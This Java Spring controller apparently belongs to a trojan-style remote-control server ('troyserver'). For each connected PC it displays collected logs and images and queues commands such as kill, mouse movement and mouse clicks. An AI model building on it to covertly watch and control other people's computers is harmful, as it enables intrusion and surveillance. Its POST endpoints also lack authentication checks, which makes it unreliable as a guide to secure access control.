package ch.lebois.troyserver.controller;

import ch.lebois.troyserver.data.entity.Client;
import ch.lebois.troyserver.data.entity.Message;
import ch.lebois.troyserver.data.repository.ClientRepository;
import ch.lebois.troyserver.data.repository.ImageRepository;
import ch.lebois.troyserver.data.repository.MessageRepository;
import ch.lebois.troyserver.model.DashboardModel;
import ch.lebois.troyserver.service.CookieService;
import javax.servlet.http.HttpServletRequest;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

/**
 * Project: Hermann
 **/


@Controller
@RequestMapping(value = {"dashboard/"})
public class DashboardController {

    private ClientRepository clientRepository;
    private MessageRepository messageRepository;
    private ImageRepository imageRepository;
    private CookieService cookieService;

    public DashboardController(ClientRepository clientRepository, MessageRepository messageRepository,
                               ImageRepository imageRepository, CookieService cookieService) {
        this.clientRepository = clientRepository;
        this.messageRepository = messageRepository;
        this.imageRepository = imageRepository;
        this.cookieService = cookieService;
    }

    @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
    public String getClientControlPanel(@PathVariable(value = "client") String clientParam, Model model,
                                        DashboardModel dashboardModel, HttpServletRequest request) {
        try {
            Client client = clientRepository.findOne(clientParam);
            if (client == null) {
                return "redirect:/dashboard";
            }
            dashboardModel.setClient(client);

            setAtributes(clientParam, model, dashboardModel, request);
            return "dashboard";
        } catch (NullPointerException e) {
            return "redirect:/login";
        }
    }

    private void setAtributes(String clientName, Model model, DashboardModel dashboardModel,
                              HttpServletRequest request) {
        model.addAttribute("model", dashboardModel);
        model.addAttribute("logs", getLogs(clientName));
        model.addAttribute("images", imageRepository.findImagesByPcNameFkOrderByNameDesc(clientName));
        String user = cookieService.getCurrentUser(request);
        model.addAttribute("user", user);
    }

    private String getLogs(String clientName) {
        String logs = "";
        Iterable<Message> logList = messageRepository.findAll();
        for (Message m : logList) {
            if (m.getPcNameFk().equals(clientName)) {
                logs = logs + m.getText() + "\n";
            }
        }
        return logs;
    }

    @RequestMapping(value = {"{client}"}, method = RequestMethod.POST)
    public String clearClientLogs(@PathVariable(value = "client") String clientParam) {
        Iterable<Message> logList = messageRepository.findAll();
        for (Message m : logList) {
            if (m.getPcNameFk().equals(clientParam)) {
                messageRepository.delete(m);
            }
        }
        return "redirect:/dashboard/" + clientParam;
    }

    @RequestMapping(value = {"{client}/edit"}, method = RequestMethod.POST)
    public String saveSettings(@PathVariable(value = "client") String clientParam,
                               @RequestParam(name = "refresh") String refresh,
                               @RequestParam(name = "kill") String kill,
                               @RequestParam(name = "mousex") String mousex,
                               @RequestParam(name = "mousey") String mousey) {
        Client client = clientRepository.findOne(clientParam);

        if (!refresh.equals(client.getRefreshtime())) {
            client.setRefreshtime(refresh);
            client.setCommands("refresh " + refresh);
        }
        if (kill.equals("kill")) {
            client.setCommands("kill");
        }
        if (!mousex.equals("") && !mousey.equals("")) {
            client.setCommands("mousemove " + mousex + " " + mousey);
        }
        clientRepository.save(client);

        return "redirect:/dashboard/" + clientParam;
    }

    @RequestMapping(value = {"{client}/click"}, method = RequestMethod.POST)
    public String saveSettings(@PathVariable(value = "client") String clientParam) {
        Client client = clientRepository.findOne(clientParam);
        client.setCommands("mouseclick");
        clientRepository.save(client);
        return "redirect:/dashboard/" + clientParam;
    }

}
